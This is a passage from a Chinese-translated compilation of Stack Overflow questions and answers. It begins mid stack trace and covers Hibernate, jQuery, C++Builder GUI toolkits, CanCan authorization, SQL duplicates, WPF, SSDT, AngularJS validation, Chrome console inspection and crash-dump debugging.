    at org.hibernate.event.internal.DefaultMergeEventListener.entityIsTransient(DefaultMergeEventListener.java:214)
    at org.hibernate.event.internal.DefaultMergeEventListener.onMerge(DefaultMergeEventListener.java:154)
    at org.hibernate.event.internal.DefaultMergeEventListener.onMerge(DefaultMergeEventListener.java:76)
    at org.hibernate.internal.SessionImpl.fireMerge(SessionImpl.java:904)
    at org.hibernate.internal.SessionImpl.merge(SessionImpl.java:888)
    at org.hibernate.internal.SessionImpl.merge(SessionImpl.java:892)
    at org.hibernate.ejb.AbstractEntityManagerImpl.merge(AbstractEntityManagerImpl.java:879)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.weld.bean.proxy.AbstractBeanInstance.invoke(AbstractBeanInstance.java:45)
    at org.jboss.weld.bean.proxy.ProxyMethodHandler.invoke(ProxyMethodHandler.java:105)
    at org.jboss.weld.proxies.EntityManager$1148094400$Proxy$_$$_WeldClientProxy.merge(EntityManager$1148094400$Proxy$_$$_WeldClientProxy.java)
    at se.raindance.persistence.RaindanceBaseHomeImpl.update(RaindanceBaseHomeImpl.java:57)
    at se.raindance.purchasecommission.home.CommissionHome.update(CommissionHome.java:59)
    at se.raindance.purchasecommission.home.CommissionHome$Proxy$_$$_WeldSubclass.update(CommissionHome$Proxy$_$$_WeldSubclass.java)
    at se.raindance.persistence.RaindanceBaseHomeImpl.persist(RaindanceBaseHomeImpl.java:67)
    at se.raindance.purchasecommission.home.CommissionHome.persist(CommissionHome.java:43)
    at se.raindance.purchasecommission.home.CommissionHome$Proxy$_$$_WeldSubclass.persist(CommissionHome$Proxy$_$$_WeldSubclass.java)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.weld.interceptor.proxy.SimpleInterceptionChain.invokeNextInterceptor(SimpleInterceptionChain.java:85)
    at org.jboss.weld.interceptor.proxy.InterceptorInvocationContext.proceed(InterceptorInvocationContext.java:127)
    at org.apache.myfaces.extensions.cdi.jpa.impl.transaction.TransactionalInterceptorStrategy.execute(TransactionalInterceptorStrategy.java:125)
    at org.apache.myfaces.extensions.cdi.jpa.impl.transaction.TransactionalInterceptor.executeInTransaction(TransactionalInterceptor.java:54)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.weld.interceptor.proxy.SimpleMethodInvocation.invoke(SimpleMethodInvocation.java:30)
    at org.jboss.weld.interceptor.proxy.SimpleInterceptionChain.invokeNextInterceptor(SimpleInterceptionChain.java:69)
    at org.jboss.weld.interceptor.proxy.InterceptorMethodHandler.executeInterception(InterceptorMethodHandler.java:112)
    at org.jboss.weld.interceptor.proxy.InterceptorMethodHandler.invoke(InterceptorMethodHandler.java:88)
    at org.jboss.weld.bean.proxy.CombinedInterceptorAndDecoratorStackMethodHandler.invoke(CombinedInterceptorAndDecoratorStackMethodHandler.java:55)
    at se.raindance.purchasecommission.home.CommissionHome$Proxy$_$$_WeldSubclass.persist(CommissionHome$Proxy$_$$_WeldSubclass.java)
    at se.raindance.purchasecommission.controller.CommissionController.saveCommission(CommissionController.java:139)
    at se.raindance.purchasecommission.controller.CommissionController$Proxy$_$$_WeldClientProxy.saveCommission(CommissionController$Proxy$_$$_WeldClientProxy.java)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.apache.el.parser.AstValue.invoke(AstValue.java:278)
    at org.apache.el.MethodExpressionImpl.invoke(MethodExpressionImpl.java:274)
    at org.jboss.weld.util.el.ForwardingMethodExpression.invoke(ForwardingMethodExpression.java:39)
    at org.jboss.weld.el.WeldMethodExpression.invoke(WeldMethodExpression.java:50)
    at com.sun.faces.facelets.el.TagMethodExpression.invoke(TagMethodExpression.java:105)
    at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:88)
    at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:102)
    at org.apache.myfaces.extensions.cdi.jsf.impl.security.SecurityViolationAwareActionListener.processAction(SecurityViolationAwareActionListener.java:56)
    at org.apache.myfaces.extensions.cdi.jsf.impl.config.view.ViewControllerActionListener.processAction(ViewControllerActionListener.java:68)
    at org.apache.myfaces.extensions.cdi.jsf.impl.listener.action.CodiActionListener.processAction(CodiActionListener.java:58)
    at javax.faces.component.UICommand.broadcast(UICommand.java:315)
    at javax.faces.component.UIViewRoot.broadcastEvents(UIViewRoot.java:794)
    at javax.faces.component.UIViewRoot.processApplication(UIViewRoot.java:1259)
    at com.sun.faces.lifecycle.InvokeApplicationPhase.execute(InvokeApplicationPhase.java:81)
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
    at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:118)
    at org.apache.myfaces.extensions.cdi.jsf2.impl.listener.phase.CodiLifecycleWrapper.execute(CodiLifecycleWrapper.java:95)
    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:593)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:936)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1004)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722) 
```

在调试的时候，我注意到它似乎来自Form实体中的一部分代码：

```
@PostLoad
public void removeHiddenFields() {
    if(fields.isEmpty()) {
        return;//don't do anything if there are no fields
    }
    for(int i = 0; i < fields.size(); i++) {
        if(fields.get(i).isHidden()) {
            fields.remove(fields.get(i));
        }
    }
} 
```

“fields.isEmpty()”部分向上抛出异常。

从我读过的内容来看，这应该可以通过将集合设置为急切地获取来解决。我认为问题出在字段集合上。但 ...

```
@JoinColumn(name = "FORM")
@OneToMany(cascade = CascadeType.ALL, fetch = FetchType.EAGER)
private List<Field> fields = new ArrayList<Field>(); 
```

它已经在热切地获取。必须这样做以解决开发早期遇到的另一个问题。

可能是什么问题呢？

添加：

表单实体是这样加载的：

有一个类可以处理 Form 实体的数据库查询。有两种方法可以从数据库中获取它们（取决于表单的类型）。

```
public List<Form> getAllActiveForms() {
    TypedQuery<Form> query = this.getEntityManager().createNamedQuery(
            "getAllActiveForms", Form.class);
    return query.getResultList();
}

public List<Form> getAllInactiveForms() {
    TypedQuery<Form> query = this.getEntityManager().createNamedQuery(
            "getAllInactiveForms", Form.class);
    return query.getResultList();
} 
```

命名查询在 Form 实体上是这样定义的：

```
@NamedQueries({
        @NamedQuery(name = "getAllActiveForms", query = "SELECT f FROM Form f WHERE f.isEnabled=true"),
        @NamedQuery(name = "getAllInactiveForms", query = "SELECT f FROM Form f WHERE f.isEnabled=false") }) 
```

函数中使用的“currentForm”是从这些列表之一中挑选出来的。

我现在还注意到，应用程序中另一个简单地更新表单的函数现在抛出了相同类型的异常。这次它来自 merge() 函数：

```
@Transactional
public Form updateAndReturn() {
    getInstance().setTimestamp(System.currentTimeMillis());
    Form f = getEntityManager().merge(getInstance());
    getEntityManager().flush();
    return f;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T12:56:30.123

这是由 Hibernate 中的错误引起的。在这里找到它：http: [//issues.jboss.org/browse/JBAS-5474](http://issues.jboss.org/browse/JBAS-5474)

它适用于版本 4.1.8 ( [https://hibernate.onjira.com/browse/HHH-6043](https://hibernate.onjira.com/browse/HHH-6043) )

问题在于@PostLoad，它显然没有按正确的顺序做事。

# javascript - 显示 div 元素 onClick

> ID：14977869
> 
> 赞同：0
> 
> 时间：2013-02-20T10:43:24.317
> 
> 标签：javascript, jquery, html

我有两个 div ：`#mosaic-content`& `#mosaic-content-1`。最初，当加载时，`#mosaic-content`将显示一个类`.active`并且`#mosaic-content-1`将被隐藏。

我有 4 个链接：

```
Home
Event
Gallery
About 
```

只有当用户点击div`#mosaic-content-1`时才会显示div `About`。对于所有其他 3 次点击，它必须保持隐藏。我编写了以下代码来实现这一点：

```
$(function () {
    $("#mosaic-content").addClass("active");
    $("#mosaic-content-1").hide();
});
$("#home, #event, #gallery").click(function () {    
    $("#mosaic-content").show();
    $("#mosaic-content").addClass("active");
    $("#mosaic-content-1").hide();
    $("#mosaic-content-1").removeClass("active");

});
$("#about").click(function () { 
    $("#mosaic-content").hide();
    $("#mosaic-content").removeClass("active");
    $("#mosaic-content-1").show();
    $("#mosaic-content-1").addClass("active");
}); 
```

但是，在上面的代码中，如果`#mosaic-content`显示 ，然后用户单击事件或图库，则再次运行这些功能，这使我的网站有点慢（`divs`充满了很多`HTML content`）。

有没有更好的方法来实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:49:57.457

用于`.is(':visible')`检查 div 是否已经可见

```
$(function () {
    $("#mosaic-content").addClass("active");
    $("#mosaic-content-1").hide();
});
$("#home, #event, #gallery").click(function () {   
if(!$("#mosaic-content").is(':visible')){
    $("#mosaic-content").show();
    $("#mosaic-content").addClass("active");
    $("#mosaic-content-1").hide();
    $("#mosaic-content-1").removeClass("active");
}

});
$("#about").click(function () { 
if($("#mosaic-content").is(':visible')){
    $("#mosaic-content").hide();
    $("#mosaic-content").removeClass("active");
    $("#mosaic-content-1").show();
    $("#mosaic-content-1").addClass("active");
}
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:30:54.523

使用类，而不是 id。

隐藏为默认块 .mosaic-content-1：

```
$(".mosaic-content-1").hide(); 
```

显示块 .mosaic-content 之后

```
$(".mosaic-content").show(); 
```

块导航中的 Onlick 功能：

```
$(".navigation a").click(function() {
   if(!$(this).hasClass("about");) {
      $(".navigation a").removeClass("active");
      $(this).addClass("active");
      $(".mosaic-content-1").hide();
      $(".mosaic-content").show();
      } else {
          $(".navigation a").removeClass("active");
          $(this).addClass("active");
          $(".mosaic-content").hide();
          $(".mosaic-content-1").show();
      }

}); 
```

# c++ - 在 C++Builder 上替代 VCL

> ID：14977871
> 
> 赞同：0
> 
> 时间：2013-02-20T10:43:32.783
> 
> 标签：c++, qt, c++builder, vcl

所以我在一家公司工作，他们一直在使用 VCL 进行 GUI 开发。我是为 Windows 创建 GUI 的新手，但我不喜欢 VCL 的选项和限制。所以我开始四处寻找其他替代品，那里有更好的选择吗？

我读过很多关于 WCF 的文章，但它只是 Visual Studio。我还发现了 QT，但我不确定如何将 C++Builder 和 QT Designer 软件配对。有可用的包吗？

或者，如果有更好的使用 C++Builder 进行 Windows GUI 开发的解决方案——我们正在使用 CodeGear 的 C++Builder 2007——你能推荐它吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:38:11.083

您可以将 Qt 与 Builder 与 qmake 或 cmake 结合使用（这两个工具都用于生成项目文件）。好吧，你可以在没有这些生成器的情况下将它与 Builder 一起使用，但是你必须自己编写所有 MOC 规则，这是一项令人厌烦的工作。

所以我的建议是使用 Qt 而不是 VCL，尤其是相对较新的 Qt 功能 - Qt Quick，它允许您以声明式方式编写 UI

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:51:11.357

wxWidgets ( [http://www.wxwidgets.org/](http://www.wxwidgets.org/) ) 与 C++ Builder 一起工作，但我很想知道为什么你会被 C++ Builder 困住？是时候继续前进了，我建议转向 QT 并使用它自己的 QT Creator，或者如果您愿意，可以选择 .Net。

# ruby-on-rails - 使用 CanCan 如何授权用户编辑关联的子模型？

> ID：14977873
> 
> 赞同：1
> 
> 时间：2013-02-20T10:43:37.317
> 
> 标签：ruby-on-rails, cancan

我有一个这样的模型结构。

```
User
 |
 +-- Order
      |
      +-- OrderItem
           |
           +-- OrderItemNote 
```

订单与用户有直接关系，所以我可以`:user_id => user.id`在`Ability`课堂上做`User.role? :customer`（例如）让他们编辑自己的订单。

但是，没有添加`:user_id`列`OrderItem`，`OrderItemNote`我不知道如何配置 CanCan 以允许用户编辑自己的对象`OrderItem`和`OrderItemNote`对象。

任何人都可以帮忙吗？

# 更新：

我选择了 jvnill 的答案，因为我使用的是 RailsAdmin（而且做一个 Ability 类比 . 更简单`load_resource`。在正常情况下，CanCan`load_resource`是一个更好的方法。

注意：虽然第一级嵌套由以下方式处理：

```
can :manage, OrderItem, order: { user_id: user.id } 
```

更深层次的嵌套...：

```
can :manage, OrderItemNote, order_item: { order: { user_id: user.id } } 
```

...抛出一个 SQL 错误

```
no such column: order_items.orders 
```

并且似乎 CanCan 将更深层次的引用（即`order`在这种情况下）视为数据库字段引用，而不是通过模型（我尝试了一些使用虚拟属性等的技巧来提供一个`order_id`或什至`user_id`除了真实数据库字段之外的任何东西名称无法识别。） - 我在有限的时间内进一步调查此问题，我将这些笔记留给我自己，以便稍后查看。

最后我认为没有必要进行更深层次的嵌套，并将注释包含在订单项本身中，因此模型如下：

```
User
 |
 +-- Order
      |
      +-- OrderItem (which includes a note) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T11:08:17.880

最简单的方法是这样的

```
can :manage, OrderItem, order: { user_id: user.id }
can :manage, OrderItemNote, order_item: { order: { user_id: user.id } } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T11:24:33.727

如果加载所有中间对象有意义并且您已调整路线（即具有所有必要的 id）：

```
class OrderItemNotesController
  load_resource :order,           through: :current_user
  load_resource :order_item,      through: :order
  load_resource :order_item_note, through: :order_item 
```

这样，您不需要任何能力：所有对象都通过关联检索。

当然应该真正适应情况（不要忘记你仍然可以这样做：`load_and_authorize_resource`如果需要）

# sql - 查找具有两个相似列和一个不同列的重复项

> ID：14977874
> 
> 赞同：1
> 
> 时间：2013-02-20T10:43:41.517
> 
> 标签：sql, sql-server, sql-server-2008, duplicates, distinct

我处于需要选择在两个特定列中具有相同内容的行和在第三列中具有不同内容的行的情况。到目前为止，我为两个类似的列得到了这个：

```
SELECT id, Title,
COUNT(*) AS NumOccurrences
FROM Table
GROUP BY id, Title
HAVING ( COUNT(*) > 1 ) 
```

我现在需要在此查询中指定第三个不同的列。我们就叫它拉尔夫吧。这显然不起作用：

```
SELECT id, Title, DISTINCT Ralph,
COUNT(*) AS NumOccurrences
FROM Table
GROUP BY id, Title
HAVING ( COUNT(*) > 1 ) 
```

那么会怎样呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:50:00.043

```
select * from (
    SELECT id, Title, COUNT(*) AS NumOccurrences
    FROM Table t
    GROUP BY id, Title
    HAVING ( COUNT(*) > 1 )
) t
cross apply (
    select distinct Ralph
    from Table
    where id = t.id and Title = t.Title
) t2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:09:08.903

您可以将 COUNT(*) 与 OVER() 子句一起使用

```
 ;WITH cte AS
 (       
  SELECT id, Title, Ralph, COUNT(*) OVER (PARTITION BY id, Title) AS cnt
  FROM dbo.test11
  GROUP BY id, Title, Ralph
  ) 
  SELECT *
  FROM cte
  WHERE cnt > 1 
```

[**SQLFiddle**](http://sqlfiddle.com/#!3/89227/1)上的演示[](http://sqlfiddle.com/#!3/89227/1)

# wpf - WPF ListBox 样式更新不起作用

> ID：14977876
> 
> 赞同：0
> 
> 时间：2013-02-20T10:43:52.957
> 
> 标签：wpf, data-binding, listbox, styles

我创建了一个`WPF ListBox`并设置了一个`itemcontainerstyle`绑定到属性并将其转换为有效颜色的值。
这在最初加载列表框时有效，因此绑定或转换器没有问题。

```
 <ListBox Grid.Column="0" Grid.Row="1" ItemsSource="{Binding Diensten}"
                     SelectedItem="{Binding SelectedDienst, Mode=TwoWay}" BorderBrush="LightGray" BorderThickness="2" Background="Transparent">
                <ListBox.ItemContainerStyle>
                    <Style TargetType="ListBoxItem">
                        <Setter Property="Background" Value="{Binding Path=IsActive, Converter={StaticResource BooleanToListBoxBgColorConverter}}" />
                    </Style>
                </ListBox.ItemContainerStyle>
                <ListBox.ItemTemplate>
                    <DataTemplate>
                        <telerik:Label Content="{Binding Path=Dienst.Description}"/>
                    </DataTemplate>
                </ListBox.ItemTemplate>
            </ListBox> 
```

但是当我的 selectedItem 更改时，我会在 refreshView 方法中触发 PropertyChangedMethod 来更新我的 ListBox。
但不幸的是，我的风格并没有应用于绑定的新值。

因此，最初为我的列表框创建的样式似乎没有更新

```
 Public Property Diensten() As List(Of ToegangDienst)
        Get
            Return _diensten
        End Get
        Set(value As List(Of ToegangDienst))
            _diensten = value
            FirePropertyChanged("Diensten")
        End Set
    End Property

    Public Property SelectedDienst() As ToegangDienst
        Get
            Return _selectedDienst
        End Get
        Set(value As ToegangDienst)
            If Diensten.Contains(value) Then
                UpdateDienstToDetails(value)
                _selectedDienst = value
                FirePropertyChanged("SelectedDienst")
                RefreshView()
            End If
        End Set
    End Property

   Private Sub RefreshView()
        FirePropertyChanged("Diensten")
        FirePropertyChanged("IsBusy")
        FirePropertyChanged("IsVisible")
        _ribbonViewModel.EvaluateCommands()
    End Sub 
```

有什么建议如何让样式也更新吗？

现在奇怪的是，我设法通过触发属性更改方法而不是通过这行代码来解决问题：

```
Diensten = Diensten.AsEnumerable().ToList() 
```

我有一个可行的解决方案，但我更喜欢一些更清洁的方法来实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:59:57.430

My`List(Of ToegangDienst)`不需要是可观察的，因为我没有从中添加或删除任何内容，但显然这也导致它在触发该`PropertyChanged`方法时不会更新整个 List。

我改变了我的

```
List(Of ToegangDienst) 
```

至

```
ObservableCollection(Of ToegangDienst) 
```

当我打电话时它起作用了

```
_selectedToegangDienst.FirePropertyChanged("IsActive") 
```

# sql-server-data-tools - MS SQL Server Data Tools 条件拆分：检查行是否已在数据库中

> ID：14977886
> 
> 赞同：0
> 
> 时间：2013-02-20T10:44:27.637
> 
> 标签：sql-server-data-tools

我需要为现有的 MS SSDT 项目创建一个数据流，将平面 CSV 文件导入现有的数据库表。到现在为止还挺好。

但是，我想拒绝列“代码”与已存储在数据库中的值匹配的所有条目。更好的是，如果可能的话，在“代码”列与数据库中的条目匹配的情况下，我想更新“描述”列。重要的是在任何情况下都不应创建重复的代码条目。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T10:48:51.440

好的，当我发现它时，我认为其他人可能会发现它很有用：

简短的回答是需要在数据源和目标之间进行查找。这种“查找”将在需要更新的匹配项和需要直接进入新表行的新值之间进行过滤（见图）。 ![带查找的 SSDT](../Images/d91c2b5bf2882c04cd3ab8bee6dfa7c0.png)

与数据库匹配并需要更新到描述的值需要输入“OLE DB 命令”。

在“查找”组件中，我们需要执行以下操作：

1.  转到常规选项卡并选择将行重定向到不匹配的输出
2.  转到连接选项卡并插入以下 SQL：

    ```
    SELECT id, code FROM tableName 
    ```

3.  进入“列”选项卡并检查“可用查找列”表中的“id”列。还要检查“代码”列并将其拖到相应的“可用输入列”对应项以将它们相互映射，以便查找可以比较它们。-- 此时如果遇到映射导致的错误，尝试将setep 2中的代码替换为：

    ```
    SELECT id, CAST(code AS nvarchar(50)) AS code FROM tableName 
    ```

4.  在错误输出中，确保“查找匹配输出”下的 id 有“复制列”的描述

现在我们需要配置“OLE DB 命令”组件：

1.  转到“连接管理器”选项卡并确保组件已连接到所需的数据库
2.  转到“组件属性”并将以下代码添加到“SQLCommand”属性：

    ```
    UPDATE tableName SET description = ? WHERE id = ? 
    ```

    注意“？”。它应该在那里表明必须将参数添加到“列映射”选项卡，不要替换它们。

3.  最后进入“Column Mappings”选项卡并将Param_0（第一个？）映射到“description”列，将“Param_1”映射到“id”列。不需要对“代码”或 db 表可能包含的任何其他列执行任何操作。

现在为自己完成一项任务给自己点赞，在 SQL 中，这通常是一行代码，大约需要 10 个耗时的步骤；-)

# javascript - 检查 angular.js 中的服务器上是否已经存在数据

> ID：14977887
> 
> 赞同：7
> 
> 时间：2013-02-20T10:44:28.277
> 
> 标签：javascript, angularjs

我是 angular.js 的新手

```
 <input type="email" disabled='disabled' name="email" ng-model="userInfo.emailAddress" 
                                    class="input-xlarge settingitem" style="height:30px;"> 

<span ng-show="myForm.email.$error.email" class="help-inline" style="color:red;font-size:10px;">
                                        Not a Valid Email Address</span> 
```

我有电子邮件字段，对应于我需要在服务器上检查它是否已经存在于数据库中。

谁能指导我完成如何使用角度指令和服务来检查服务器的步骤

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-20T11:05:05.097

我建议编写一个插入[NgModelController#$parsers管道的指令（检查来自](http://docs.angularjs.org/api/ng.directive%3angModel.NgModelController)[http://docs.angularjs.org/guide/forms](http://docs.angularjs.org/guide/forms)的“自定义验证” ）。

这是此类指令的草图：

```
.directive('uniqueEmail', ["Users", function (Users) {
  return {
    require:'ngModel',
    restrict:'A',
    link:function (scope, el, attrs, ctrl) {

      //TODO: We need to check that the value is different to the original

      //using push() here to run it as the last parser, after we are sure that other validators were run
      ctrl.$parsers.push(function (viewValue) {

        if (viewValue) {
          Users.query({email:viewValue}, function (users) {
            if (users.length === 0) {
              ctrl.$setValidity('uniqueEmail', true);
            } else {
              ctrl.$setValidity('uniqueEmail', false);
            }
          });
          return viewValue;
        }
      });
    }
  };
}]) 
```

这`Users.query`是一个异步调用，用于检查电子邮件是否唯一。当然，您应该用对后端的调用来代替它。

完成后，可以像这样使用该指令：

```
<input type="email" ng-model="user.email" unique-email> 
```

该指令的示例取自Angular[应用程序](https://github.com/angular-app/angular-app)，一些 AngularJS 社区成员试图将其放在一起以说明常见用例。可能值得一试，看看所有这些如何在完整的应用程序中组合在一起。

# javascript - 是否可以在 Google Chrome 的控制台中仅显示用户定义的功能和属性？

> ID：14977889
> 
> 赞同：3
> 
> 时间：2013-02-20T10:44:34.440
> 
> 标签：javascript, algorithm, function, google-chrome-devtools, host-object

在 Firebug 中，您可以将 DOM 选项卡的输出设置为仅显示用户定义的函数和属性。这有助于检查您是否有对象逃逸到全局命名空间中。Chrome中是否有等价物？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-26T21:05:49.580

这是一个近似值：

控制台版本：

```
var current;
for(current in window)
  {
  /* If the property is not null or undefined */
  if (!!window[current] )
    {
    /* If the constructor is the Function object */
    if (/Function/.test(String(window[current].constructor) ) )
      {
      /* Print to the console */
      console.log(current)
      }
    }
  } 
```

书签版本：

```
javascript:void(function(){for(_ in window) { if (!!window[_] ) { if (/Function/.test(String(window[_].constructor) ) ) { console.log(_) } } }}()) 
```

通用版本：

```
function getUDFs()
{
var current;
/* Use current instead of _ to avoid creating an iterator global variable */
for(current in arguments[0])
  {
  /* If the property is not null or undefined */
  if (!!arguments[0][current] )
    {
    /* If the constructor is the Function object */
    if (/Function/.test(String(arguments[0][current].constructor) ) )
      {
      /* Print to the console */
      console.log(current)
      }
    }
  }
 } 
```

递归版本：

```
function getUDFs()
{
var current;
/* Use current instead of _ to avoid creating an iterator global variable */
for(current in arguments[0])
  {
  getUDFs.id = arguments[1]  + " => ";
  /* If the property is not null or undefined */
  if (!!arguments[0][current] )
    {
    /* If the constructor is the Function object */
    if (/Function/.test(String(arguments[0][current].constructor) ) )
      {
      /* Print to the console */
      console.log(getUDFs.id + current)
      }

    /* Check object properties */
    if (/Object/.test(String(arguments[0][current].constructor) ) )
     {
     getUDFs(arguments[0][current], getUDFs.id + current)
     }

    /* Check prototype properties, but skip constructor prototypes */

    if (!!arguments[0][current] && arguments[0][current].hasOwnProperty("prototype") && arguments[0][current] !== arguments[0]["constructor"])
     {
     getUDFs(arguments[0][current]["prototype"], getUDFs.id + current + " => prototype")
     }
    }
  }  
 }
 getUDFs(jQuery,"jQuery") 
```

带存储的递归版本：

```
 function getUDFs()
    {
    var current;

     /* Use current instead of _ to avoid creating an iterator global variable */

    for(current in arguments[0])
      {
      getUDFs.id = arguments[1]  + " => ";

      /* If the property is not null or undefined */
      if (!!arguments[0][current] )
        {
        /* If the constructor is the Function object */
        if (/Function/.test(String(arguments[0][current].constructor) ) )
          {
          /* Store in an array */
          if (getUDFs.hasOwnProperty("data") )
            {
            getUDFs.data.push(getUDFs.id + current)
            }
          else
            {
            getUDFs.data = []
            }
          }

        if (/Object/.test(String(arguments[0][current].constructor) ) )
         {
         getUDFs(arguments[0][current], getUDFs.id + current)
         }
        }
      }  
     }
     getUDFs(jQuery,"jQuery") 
```

具有取证功能的递归版本：

```
function getUDFs()
{
var current;

 /* Use current instead of _ to avoid creating an iterator global variable */

for(current in arguments[0])
  {
  getUDFs.id = arguments[1]  + " => ";

  /* If the property is not null or undefined */
  if (!!arguments[0][current] )
    {
    /* If the constructor is the Function object */
    if (/Function/.test(String(arguments[0][current].constructor) ) )
      {
      /* Store in an array */
      if (getUDFs.hasOwnProperty("data") )
        {
        try{getUDFs.data.push(getUDFs.id + current + String().concat("- args: ","(", arguments[0][current]["length"], ")"))}catch(e){getUDFs.data.push(getUDFs.id + current)};

        try{getUDFs.data[getUDFs.data.length-1] += "required:" + !arguments[0][current]() ? true: false}catch(e){getUDFs.data[getUDFs.data.length-1] += "required: true"}
        }
      else
        {
        getUDFs.data = []
        }
      }

    if (arguments[0].hasOwnProperty(current) )
      {
      if (/Object/.test(String(arguments[0][current].constructor) ) )
        {
        getUDFs(arguments[0][current], getUDFs.id + current)
        }
      }
    }
  }  
 }
 getUDFs(jQuery,"jQuery");
 getUDFs.data.toString().replace(",","\n","g") 
```

**参考**

*   [JavaScript 原型和构造函数](http://tobyho.com/2010/11/22/javascript-constructors-and/)
*   [ECMAScript-5 如何仍然不允许对数组进行子类化](http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/)

# c# - 如何读取故障转储文件（我有源代码和 .pdb 文件）

> ID：14977894
> 
> 赞同：4
> 
> 时间：2013-02-20T10:44:44.753
> 
> 标签：c#, windows, visual-studio-2010, crash, minidump

我已经阅读了 StackOverflow 上已经存在的问题，但我仍然无法让它发挥作用。

我有

*   来自客户的小型转储文件
*   与客户获得的代码完全相同的版本
*   在调试目录中，.pdb 文件为代码。

我尝试将迷你转储文件放在调试目录中，然后在 Visual Studio 2010 中打开它。我不知道这是否正确，或者下一步该做什么。

“开始调试”在正常的“调试”菜单中显示为灰色。

Minidump File Summary 选项卡的右上角有一个带有“Actions”的框。所以我点击了“仅使用本机调试”，但我得到的只是“当前位置没有可用的源代码”。

我一定错过了一些非常简单的东西 - 请有人给我一个提示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-04-02T14:20:48.273

只是将各种信息汇总到一个答案中：

您是否有在构建程序时创建的 .pdb 文件？仅仅重建相同的源是行不通的，**你需要为每个 build 保留 .pdb 文件**。– [亚历克斯·法伯 2013](https://stackoverflow.com/users/279313/alex-farber)年 2 月 20 日在 11:05

“在将 PDB 与二进制文件（DLL 或 exe）匹配时，调试器会匹配文件名、时间戳和校验和等信息。” [（Saikat Sen，Codeproject 文章）](http://www.codeproject.com/Articles/6084/Windows-Debuggers-Part-A-WinDbg-Tutorial)

按照 AlexFarber 的提示，我将客户构建的源代码和发布文件夹复制到我的计算机上（整个构建已保存，包括发布文件夹中的 .pdb 和 .exe 文件）。

然后我将转储文件复制到发布文件夹中，并将 Microsoft 符号加载到同一文件夹中。

然后我再次将转储文件打开到 Visual Studio 2010 中。

我没有看到比以前更有帮助的东西，我认为这是由于这个原因 -[请参阅这个 SO question 的接受答案](https://stackoverflow.com/questions/4699285/need-help-with-debugging-dump-files-in-visual-studio)。我正在使用 C# 和 .NET 2.0 程序集，看来我只能查看 .NET 4.0 程序集的源代码。

接下来，我将尝试 Hans Passant 在同一个问题上推荐的名为 sos.dll 的 WinDbg 插件。

**如何绕过使用同一构建中的 pdb 文件的需要：**

如果您使用 WinDbg，我认为您可以绕过对相同 .pdb 文件的此要求。来自[virtualdub](http://virtualdub.org/blog/pivot/entry.php?id=215) “如果调试器很顽固并且不想加载符号，因为它认为它们不匹配，您可以使用 .symopt+ 0x40 来设置“加载任何东西”标志。”

